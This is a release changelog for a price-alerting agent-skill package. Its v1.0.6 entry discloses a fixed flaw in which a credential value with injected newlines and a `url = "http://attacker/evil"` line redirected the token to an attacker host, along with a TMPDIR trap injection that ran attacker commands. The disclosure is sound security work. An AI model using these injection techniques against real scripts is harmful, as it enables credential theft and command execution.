# Changelog

Hand-written. The top entry below IS the changelog `publish.sh` reads and
sends to ClawHub (`read_top_changelog_entry` in `publish.sh` takes everything
between the first and second `## ` heading) — there is no heuristic
git-diff-based generator here, unlike `agent-skill/publish.sh`. Add a new
`## vX.Y.Z · YYYY-MM-DD` entry at the top for every release; never edit an
already-published entry.

## v1.0.8 · 2026-10-10

Documentation follow-up to the platform change for #1797 (Java + Node tiers; no script change).

- **The `maxStaleSeconds` gate row no longer tells you to pass `90000`.** The
  platform now derives the default staleness threshold from the asset grain
  when a rule carries no `maxStaleSeconds`: a daily-grain asset is stale only
  after a full trading day's expected landing has been missed (weekends and
  long holidays do not trip it); every other asset keeps the 1800-second
  default. A fixed `90000` could not express weekends or holidays and would
  skip a healthy daily rule over them. An explicit `maxStaleSeconds` still
  always wins.
- `metric.alert.evaluate-now` (and the saved-rule dry run) now also return a
  read-only `freshness` object (`timestamp`, `ageSeconds`, `grain`,
  `wouldBeSkippedStale`, `staleReason`); `wouldTrigger` is unchanged. Treat
  `wouldTrigger:true` together with `freshness.wouldBeSkippedStale:true` as
  "the condition holds, but the real evaluation would be SKIPPED_STALE". A
  MISSING `freshness` means "cannot tell" (asset not visible to the caller's
  team, no probe result, or the probe errored) -- it does NOT mean the data is
  fresh. The weekend/holiday handling relies on the trading calendar, which
  has no holiday data from 2027 on until it is added (weekday-only fallback,
  so holidays in 2027+ can still be skipped as stale).
- No change to the alert/rule/webhook flow, the 11-step flow or the 20-skill set.

## v1.0.7 · 2026-09-18

Fixes the finding ClawHub's automated re-scan kept `1.0.6` at
`suspicious`/`fail` for: "a disclosed temporary-file exposure that merits
review" (#1411) -- the request-body temp file `1.0.6`'s own changelog
disclosed but deliberately deferred.

- **The request body no longer touches disk at all.** `scripts/lg_agent_exec.sh`
  and `scripts/lg_agent_approval.sh` used to write the outgoing JSON body to
  a temp file (`--data-binary "@file"`) to dodge a separate MSYS2/curl.exe
  argv-reencoding bug. On Windows/MSYS2 that file inherited its `%TEMP%`
  directory's ACL (`BUILTIN\Users:(RX)`, `Everyone:(RX)`) instead of a
  private mode bit, so any local principal could read it for the short life
  of the call -- this is the exposure #1410 disclosed and deferred, and
  #1411 removes now. The body now joins the SAME `-K -` config stream the
  credential already travels over (`data-binary = "<escaped>"`, using the
  same CR/LF-rejecting, `\`/`"`-escaping function `1.0.6` added for the
  credential headers) -- no file, no ACL to reason about, and the EXIT
  cleanup trap this removes was itself a second, independent injection
  surface (#1410's trap-reparse class) that no longer exists to reason
  about either. `-K -` remains version-floor-free -- no feature/version
  probe needed.
- **BREAKING (loopback / self-hosted only): a request body between roughly
  77KB and 256KB can no longer be sent through a loopback or self-hosted
  Express connection.** Escaping for the config stream roughly doubles a
  quote-dense JSON body's size, so bodies above ~77KB can produce a config
  line over the new 102,400-byte local ceiling this release adds. On a host
  running curl 7.81–8.1.x (e.g. Ubuntu 22.04, Debian 12) that ceiling is
  curl's own real `MAX_CONFIG_LINE_LENGTH`; curl 8.2.0 (2023-07) onward
  raised that internal ceiling to 10 MiB, so on a newer curl this specific
  number is this wrapper's OWN conservative, version-independent choice
  (applied uniformly rather than probing the local curl version), not a
  curl limitation on that host. Either way, this repo's public entry point
  is unaffected: `privora.cn` already rejects anything over ~5–8KB at the
  nginx layer (HTML 414) before this ceiling would ever matter. Split a
  large payload into smaller calls, or use the platform UI, for anything
  near this size.
- No change to the alert/rule/webhook flow itself; this is a transport-only
  fix, same as `1.0.5`/`1.0.6`.

## v1.0.6 · 2026-09-15

Follow-up to `1.0.5`'s destination/allowlist hardening. Fixes the class of
findings that stayed `unexpected` across three independent post-1.0.5 scans
(#1410) -- same `T09` id as `1.0.5`, different code shapes. Republish only;
no change to the 11-step flow or the 20-skill set.

- **The bearer token (and, in `lg_agent_approval.sh`'s cookie/CSRF mode, the
  session cookie + CSRF token) no longer travels in `curl`'s command-line
  arguments.** All three shared wrapper scripts now pipe
  `header = "Authorization: Bearer ..."` (and, for `lg_agent_approval.sh`,
  an additional `header = "..."` line for `Cookie` / `X-CSRF-Token`) into
  `curl -K -` (config read from stdin) instead of passing `-H "Authorization:
  Bearer ${LG_AGENT_TOKEN}"` as an argv element. Reading another process's
  command-line arguments on the same host (Linux `/proc/*/cmdline`; a
  Windows process listing) needs no elevation and no write capability at
  all -- a materially lower bar than "already able to set this process's
  environment variables or write its filesystem" (the bar the pre-existing
  `_mktemp_body` disclaimer covers), so that disclaimer does not cover this
  finding. `-K` (config-from-stdin) is old enough to work on every curl
  version these scripts target -- no feature/version probe needed, unlike
  `--expand-header` (curl >= 8.3), which would let the request body travel
  the same way but is deferred to a follow-up issue for exactly that
  version-floor reason (Ubuntu 22.04 LTS ships curl 7.81, Debian 12 ships
  7.88, both well short of 8.3).
- **(found in this round's LA exit review, no separate issue -- introduced and fixed inside #1410) Every value piped into that `-K -` config stream is now
  CR/LF-rejected and `\`/`"`-escaped before being embedded.** `-K -` reads a
  small curl-specific config LANGUAGE, not raw bytes, and a
  `header = "..."` line is a double-quoted STRING in that language whose
  `\"` / `\\` escapes are recognized by curl's own parser. Splicing an
  untrusted `LG_AGENT_TOKEN` / `LG_AGENT_COOKIE_HEADER` / `LG_AGENT_CSRF_TOKEN`
  value into that string with zero escaping -- what the first pass of this
  same fix originally shipped -- let the value's own `"`, `\`, or embedded
  CR/LF bytes break out of the field and inject a NEW config directive.
  Reproduced directly against a real (pre-fix) script with a raw socket
  capture: a value containing a literal `"` silently truncated at the
  quote with no error; a value containing CRLF plus a second
  `header = "X-Injected: pwned"` line got that header actually injected;
  a value containing CRLF plus a second `url = "http://attacker/evil"`
  line made curl issue a SECOND request to that attacker-chosen URL,
  carrying the real credential (Cookie + X-CSRF-Token, or bearer token) --
  session/token exfiltration to an address the attacker picked, not the
  configured destination. This is the exact same class of bug as the trap
  fix immediately below in a different spot: an untrusted string spliced
  into a mini-language stream that is later re-parsed by its consumer.
  Fixed in all 7 real `curl -K -` call sites across all three scripts
  (`lg_agent_exec.sh`: 1; `lg_agent_list.sh`: 2; `lg_agent_approval.sh`: 4)
  by rejecting any value containing a CR or LF byte outright (escaping
  cannot neutralize a raw newline in this mini-language -- only rejecting
  the value can) and, for everything else, escaping backslash first and
  then the double quote (the only order curl's own `-K` parser round-trips
  correctly). Every value is validated in the MAIN shell before the `-K -`
  pipeline to curl is ever started, not inside the piped component --
  checking it only on the far side of the pipe risks `set -o pipefail`
  masking a silent, under-authenticated request instead of a loud failure.
- **Both `lg_agent_exec.sh`'s and `lg_agent_approval.sh`'s request-body
  cleanup traps no longer re-parse a hostile path as shell syntax.** Both
  scripts' EXIT traps that delete the temporary request-body file were
  `trap "rm -f \"$var\"" EXIT` -- double-quoting splices the path into the
  trap STRING at set-time, and that string is RE-PARSED BY THE SHELL the
  instant the trap fires. Since the path is derived from `${TMPDIR:-/tmp}`
  (an external environment variable), a `TMPDIR` value containing shell
  metacharacters became arbitrary command execution at trap-fire time
  (verified directly, against both scripts: a crafted `TMPDIR` runs an
  attacker-chosen command when the script exits) -- and, as an aggravating
  factor, the same reparse also broke the cleanup it sits inside, so the
  real body file was never actually deleted. `lg_agent_approval.sh` is the
  higher-blast-radius of the two: its cookie/CSRF mode sends a session
  cookie, not just a scoped agent token, so the same injection there is at
  least as serious. The fix (identical shape in both scripts, for future
  parity checking) is a global (non-`local`) variable plus a single-quoted
  trap body, which defers expansion to trap-fire time and never re-parses
  the path as shell syntax, while still resolving correctly under `set -u`
  once any enclosing function's local scope has unwound.
  `lg_agent_approval.sh` is not staged into any published package today
  (`agent-skill-alert/package.sh` ships only `lg_agent_exec.sh`;
  `agent-skill/package.sh`, i.e. `privora-cn-quant`, ships `SKILL.md`, the
  demo gif, `lg_agent_list.sh`, and `lg_agent_exec.sh` -- neither stages
  `lg_agent_approval.sh`), so this half of the fix is repo-internal hygiene
  and does not change the behavior of anything previously distributed.
- **Does NOT fix request-body-on-disk exposure (Windows/MSYS2 ACL
  inheritance).** The request body still reaches curl via a temporary file
  (`--data-binary "@..."`), and on Windows/MSYS2 that file still inherits
  its `%TEMP%` directory's ACL rather than getting a private mode bit (POSIX
  hosts still get a real `mktemp` 0600 file, unaffected). Moving the body to
  `curl`'s stdin alongside the header config (curl's `--expand-header` path,
  deferred above) would close this too, but requires the curl >= 8.3 floor
  this release deliberately avoids. Do not read this release as having
  closed the on-disk request-body exposure that `_mktemp_body`'s comment
  already discloses -- it has not.
- Does not claim any change to the ClawScan rating itself -- that depends on
  an actual re-scan of the published package, not on this changelog entry.

## v1.0.5 · 2026-09-15

Destination-validation + allowlist-hardening fix, in response to ClawScan's
`security.status = suspicious` on `1.0.4` (`T09`, `LP3` — see
`docs/plans/2026-09-15-agent-exec-wrapper-destination-and-allowlist-hardening.md`
for the full design). No change to the 11-step flow or the 20-skill set.

- **`LG_AGENT_BASE_URL` is now validated before any credential is sent to
  it** (T09/E1): the shared `scripts/lg_agent_exec.sh` rejects a non-`http(s)`
  scheme, an embedded-credentials URL (`https://user:pass@host`), and
  plaintext `http://` against anything other than a loopback host
  (`localhost` / `127.0.0.1` / `[::1]`) — closing the "one env var
  silently redirects the bearer token to any host" gap. Scheme and host are
  matched case-insensitively, and the URL curl actually receives is your
  original one (normalization is used for the decision only). Because this
  package ships an `allowed-skills.txt`, its copy of the script additionally
  pins the host to `{privora.cn, www.privora.cn, lg-data.cc}` on **every**
  call — a packaging-honesty check, not a security boundary (the real
  boundary remains server-side scope enforcement). The umbrella package
  `privora-cn-quant` ships no allowlist file, so its copy keeps accepting a
  self-hosted host, as its documentation promises.
- **Default destination flipped from `lg-data.cc` to `privora.cn`** to match
  current documentation; both domains serve this API path directly (no
  behavior change for the common no-env-var case).
- **The legacy single-arg JSON-envelope form is now refused outright** when
  this package's allowlist is active, instead of best-effort regex-extracting
  the skill id and failing open when extraction misses. This form is not
  part of this package's documented 11-step flow.
- **`LG_AGENT_ALLOWED_SKILLS_FILE` can no longer widen this package's shipped
  allowlist**: pointing it at a nonexistent path used to silently reopen the
  gate to every skill id; the shipped `allowed-skills.txt` is now
  authoritative whenever present, full stop.
- **Frontmatter now declares this package's capability boundary** (shell +
  network, restricted to `POST <LG_AGENT_BASE_URL>/agent/skills/execute`)
  in response to ClawScan's `LP3` finding.
- Does not claim any change to the ClawScan rating itself — that depends on
  an actual re-scan of the published package, not on this changelog entry.

## v1.0.4 · 2026-08-31

Packaging-narrowing fix (#1037, #1038) — no change to the 11-step flow, the
20-skill set, or any other documented behavior.

- **Stopped shipping `lg_agent_list.sh`** (#1037). This package's documented
  flow never calls it (grep-verified against SKILL.md); shipping it gave a
  `realtime-alerting` token unfiltered discovery of every skill visible to it
  — not just this package's 20 — which ClawScan flagged as SDI-1/SDI-2 and
  rated the published `1.0.3` package `DO_NOT_INSTALL` (score 66 / HIGH).
- **`scripts/lg_agent_exec.sh` now ships with a generated `allowed-skills.txt`**
  derived at packaging time from the `realtime-alerting` preset (18 scopes →
  20 skill ids, `lib/skill-catalog.js`'s new `resolvePresetSkillIds`) — the
  shared wrapper refuses any skill id outside that set. This is a
  **packaging-honesty control, not a security control**: it is client-side
  and trivially bypassable (edit/delete the file, or call
  `POST /agent/skills/execute` directly). The actual, non-bypassable boundary
  remains server-side scope enforcement, unaffected by this file's presence
  or contents. One canonical copy of `lg_agent_exec.sh` still serves both
  `privora-alert` and `privora-cn-quant` (no forked script) — `privora-cn-quant`
  ships no allowlist file, so its copy is unaffected and behaves exactly as
  before.
- **Republish also picks up two shared-script fixes this package has not
  shipped since 2026-08-11** (#1038): the Windows/MSYS2 non-ASCII payload
  corruption fix (#920, `784a1ee8`) and the approval-reason repair + curl-trap
  doc cleanup (#927, `92c55ce0`). Non-ASCII payloads (Chinese
  `messageTemplate` / channel names / thresholds) are this package's normal
  path, not an edge case, so this closes a real corruption window for
  Windows users following the documented flow.

Does not claim any change to the ClawScan rating — that depends on an actual
post-publish re-scan (TP4 should reduce given the wrapper's own scope, but is
not guaranteed to clear, since the shipped script source remains generically
capable code).

## v1.0.3 · 2026-08-11

Keep 股价预警 in the title / DISPLAY_NAME, not just keywords (fast-follow to
1.0.2). 股价预警 is the one term browser + anonymous-probe testing confirmed
this package already ranks #1-and-unique for — a proven, current win — whereas
黄金 / 基金 are SEO-supported strategic bets still unproven on this package's
own side until the listing ranks. Demoting a confirmed winner out of the
highest-weight field (the ClawHub-rendered name) to chase unproven terms is
asymmetric; the title holds multiple terms (the umbrella lists five asset
classes), so 黄金 / 基金 lead for new reach while 股价预警 holds the existing
win. No skill behavior or other metadata changed.

## v1.0.2 · 2026-08-11

Positioning + discoverability reweight (LM review). No skill behavior changed.

- **Primary framing changed from "实时告警" to "实时监控"** — continuous
  threshold-watching is the product, webhook/飞书/微信 notification is the
  mechanism under it, matching what `metric_alert_poll` (process 3196)
  actually does (§6). "监控" is also the dominant search framing in this
  category (competitor products use "XX监控" naming) and the umbrella
  package already ranks #1 for it; this package previously diluted the
  same query across two compound phrases instead of leading with the
  bare term.
- 黄金 leads (黄金实时监控 / 黄金监控) — backed by a real anonymous-readable,
  same-day-fresh dashboard ("SGE 黄金白银市场"), not just a ranking bet.
- 基金 second (基金净值监控) — **deliberately without "实时"**: no
  anonymous-readable fund dashboard exists today and anonymous fund
  samples are stale; the monitoring capability is real, the freshness
  claim is not yet demonstrable to a cold visitor.
- `股价预警` kept (not demoted with bare `A股`) — confirmed #1-and-only
  ranking for this exact package; A股 as a bare market tag stays capped
  and last, unrelated ranking profile.
- §0 now bridges "监控" (search term) to "指标告警" (the in-product page
  name, `alertsPage.title` in `locales/zh-CN.json`) so a converted user
  isn't confused on arrival.

## v1.0.1 · 2026-08-11

Discoverability-only release — no skill behavior changed. Reworked the ClawHub
listing metadata (title / description / keywords / display name) so the package
surfaces for the natural-language phrases a user actually types for this
scenario. Keywords went from 10 to 20, adding the missing high-intent terms
(股价预警 / 价格预警 / 股价跌破提醒 / 阈值监控) and English coverage
(metric alert / threshold alert / price alert / webhook notification) that the
first release had none of. Dropped the `dashboard alert` keyword: it
contradicted the package's own design — alerts bind to a resource field, never
to a dashboardId (§1) — so it set a false expectation. Display name and doc
title no longer disagree; both now lead with 实时告警 / 股价预警 · 飞书/微信 Webhook.

## v1.0.0 · 2026-08-10

First release. Scenario-shaped package (PR-4 of the agent-skill 场景化重构):
one skill — 「资产字段跌破/突破阈值就通知我」 — start to finish, instead of the
97-skillId umbrella reference manual (`privora-cn-quant`).

- 11-step flow, one running example (贵州茅台 `600519` `close_price` 跌破
  1500), from "have you got a webhook channel" through a persisted, armed
  alert rule.
- Ships the **create-disabled → test → patch → toggle** sequence for
  forward-looking thresholds (the case the underlying `metric.alert.test`
  dry-run cannot prove directly, because `isTest` bypasses the gates but
  never the comparison itself): create the rule disabled with a
  deliberately-already-crossed placeholder threshold, prove the whole
  webhook/template/channel chain with a real `metric.alert.test` delivery,
  then `metric.alert.patch` in the user's real threshold and `metric.alert.toggle`
  to arm it — with no window where a placeholder threshold is live.
  `metric.alert.create` now accepts `enabled:false` for this
  (catalog addendum landing in the same PR).
- §5 documents the six silent gates (disabled / snooze / silenceMinutes /
  maxFiresPerDay / maxStaleSeconds / data-dedup) as the design they are, each
  with its own symptom + diagnostic call + fix — no "see troubleshooting"
  appendix.
- 20 skillIds only (the `realtime-alerting` preset's reachable set), no
  `delete`. Full 97-skillId reference stays in `privora-cn-quant` for anyone
  who needs more than this one scenario.
